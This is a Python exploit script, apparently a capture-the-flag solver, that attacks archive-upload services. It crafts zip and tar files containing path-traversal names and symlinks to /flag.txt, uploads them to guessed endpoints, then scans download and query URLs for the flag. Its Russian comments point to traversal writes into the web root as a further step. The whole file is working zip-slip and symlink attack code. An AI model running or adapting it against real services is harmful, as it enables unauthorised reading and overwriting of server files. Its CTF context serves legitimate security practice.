#!/usr/bin/env python3
import os, io, re, sys, stat, zipfile, tarfile, requests

BASE = os.environ.get("TARGET_URL", "http://target:8000").rstrip("/")
ART = os.environ.get("VEGA_CTF_ARTIFACT_DIR", ".")
OUT = os.path.join(ART, "flag.txt")
TIMEOUT = 15

UPLOAD = [
    "/upload",
    "/api/upload",
    "/archive",
    "/extract",
    "/import",
    "/zip",
    "/files/upload",
    "/upload/archive",
]
READ_PATH = [
    "/files/{}",
    "/download/{}",
    "/view/{}",
    "/file/{}",
    "/files/{}/download",
    "/archive/{}",
]
READ_QUERY = ["/", "/files", "/list", "/download", "/view", "/file", "/files"]

TRAVERSALS = [
    "../flag.txt",
    "../../flag.txt",
    "../../../flag.txt",
    "../../../../flag.txt",
    "../../../../../flag.txt",
    "../../../../../../flag.txt",
    "....//flag.txt",
    "....//....//flag.txt",
    "....//....//....//flag.txt",
    "/flag.txt",
]
SYMLINK_TARGETS = ["/flag.txt", "../flag.txt", "../../flag.txt", "../../../flag.txt"]
NAMES_TO_READ = [
    "flag",
    "flag.txt",
    "flag_link",
    "link",
    "secret",
    "secret.txt",
    "../flag.txt",
    "../../flag.txt",
    "../../../flag.txt",
]

FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,}\{[^}\r\n]{1,200}\}")


def build_zip(path):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        for n in TRAVERSALS:
            zf.writestr(n, "x")
        for n in ["flag", "flag.txt", "flag_link", "link", "secret"]:
            for target in SYMLINK_TARGETS[:2]:
                zi = zipfile.ZipInfo(n)
                zi.create_system = 3
                zi.external_attr = (stat.S_IFLNK | 0o777) << 16
                zf.writestr(zi, target)
    print(f"[i] zip готов: {path} ({os.path.getsize(path)}b)")


def build_tar(path):
    with tarfile.open(path, "w:gz") as tf:
        for n in TRAVERSALS:
            ti = tarfile.TarInfo(n)
            data = b"x"
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
        for n in ["flag", "flag.txt", "flag_link", "link", "secret"]:
            for target in SYMLINK_TARGETS:
                ti = tarfile.TarInfo(n)
                ti.type = tarfile.SYMTYPE
                ti.linkname = target
                tf.addfile(ti)
    print(f"[i] tar готов: {path} ({os.path.getsize(path)}b)")


def upload(path):
    for ep in UPLOAD:
        try:
            with open(path, "rb") as f:
                r = requests.post(
                    f"{BASE}{ep}",
                    files={"file": (os.path.basename(path), f)},
                    timeout=TIMEOUT,
                    allow_redirects=False,
                )
            print(f"[i] POST {ep} -> {r.status_code} {len(r.text or '')}b")
            if r.status_code in (200, 201, 202, 302):
                return ep
        except requests.RequestException as e:
            print(f"[-] {ep}: {e}")
    return None


def read_all():
    for name in NAMES_TO_READ:
        for tpl in READ_PATH:
            url = f"{BASE}{tpl.format(name)}"
            try:
                r = requests.get(url, timeout=10, allow_redirects=False)
            except requests.RequestException:
                continue
            body = r.text or ""
            m = FLAG_RE.search(body)
            if m:
                print(f"[+] HIT {url} -> {m.group(0)}")
                return m.group(0)
            if (
                r.status_code == 200
                and body
                and "<html" not in body.lower()
                and len(body) < 3000
            ):
                print(f"[?] {url} -> {body[:120]!r}")
        for ep in READ_QUERY:
            for p in ("file", "name", "path", "doc"):
                try:
                    r = requests.get(
                        f"{BASE}{ep}",
                        params={p: name},
                        timeout=10,
                        allow_redirects=False,
                    )
                except requests.RequestException:
                    continue
                m = FLAG_RE.search(r.text or "")
                if m:
                    print(f"[+] HIT {ep}?{p}={name!r} -> {m.group(0)}")
                    return m.group(0)
    return None


def main():
    if upload("/tmp/evil.zip") is None:
        build_tar("/tmp/evil.tar.gz")
        upload("/tmp/evil.tar.gz")
    flag = read_all()
    if not flag:
        print(
            "[-] Флаг не найден. Скорее всего, сервис не отдаёт распакованное по имени."
        )
        print(
            "    Тогда смотрите материалы: возможно, нужен traversal-write в web-root,"
        )
        print("    либо перезапись файла, который потом рендерится.")
        sys.exit(1)
    os.makedirs(ART, exist_ok=True)
    with open(OUT, "w", encoding="utf-8") as f:
        f.write(flag.strip() + "\n")
    print(f"[+] Записано в {OUT}: {flag}")


if __name__ == "__main__":
    build_zip("/tmp/evil.zip")
    main()
